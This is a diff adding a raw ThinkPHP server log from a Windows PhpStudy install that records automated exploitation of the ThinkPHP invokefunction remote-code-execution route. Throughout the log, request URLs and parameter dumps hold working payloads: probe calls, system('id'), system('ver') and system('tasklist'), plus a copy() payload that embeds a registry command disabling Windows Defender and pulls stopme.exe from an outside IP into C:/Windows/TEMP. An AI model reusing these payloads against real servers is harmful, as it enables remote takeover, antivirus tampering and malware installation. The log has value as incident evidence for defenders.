+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T14:09:19+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4DDJ957C63.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4DDJ957C63.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/4DDJ957C63.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T14:09:23+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4DDJ957C63.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2F4DDJ957C63.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/4DDJ957C63.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T15:11:55+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:11:58+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.062400s][吞吐率：16.03req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:11:59+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187201s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:12:01+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:12:02+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.436801s][吞吐率：2.29req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015601s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:15:08+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNUE20DG7W2.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNUE20DG7W2.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/NUE20DG7W2.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T15:15:11+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNUE20DG7W2.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FNUE20DG7W2.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/NUE20DG7W2.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T15:31:53+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:31:56+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:31:57+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187201s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:31:59+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.171600s][吞吐率：5.83req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
